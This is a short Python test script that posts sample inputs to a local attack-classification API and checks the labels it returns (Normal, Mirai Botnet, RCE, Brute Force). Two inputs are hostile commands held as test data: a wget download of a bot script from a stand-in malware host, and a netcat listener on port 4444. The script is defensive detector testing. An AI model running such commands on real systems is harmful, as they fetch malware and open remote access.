import requests
import json
import time

def test_api():
    url = "http://localhost:8000/predict"
    
    test_cases = [
        {"input": "ls -la", "expected": "Normal"},
        {"input": "wget http://malware.site/bot.sh", "expected": "Mirai Botnet"},
        {"input": "nc -lvp 4444", "expected": "RCE"},
        {"input": "admin", "expected": "Brute Force"}
    ]
    
    print("Waiting for API to start...")
    # Simple retry loop
    for i in range(10):
        try:
            health = requests.get("http://localhost:8000/health")
            if health.status_code == 200:
                print("API is UP!")
                break
        except requests.exceptions.ConnectionError:
            time.sleep(1)
    else:
        print("API failed to start.")
        return

    print("\nRunning Tests:")
    for case in test_cases:
        payload = {"input": case["input"]}
        try:
            response = requests.post(url, json=payload)
            if response.status_code == 200:
                prediction = response.json().get('label')
                status = "PASS" if prediction == case["expected"] else f"FAIL (Got {prediction})"
                print(f"Input: {case['input'][:30]:<35} | Expected: {case['expected']:<15} | Result: {status}")
            else:
                print(f"Error: {response.status_code} - {response.text}")
        except Exception as e:
            print(f"Request failed: {e}")

if __name__ == "__main__":
    test_api()
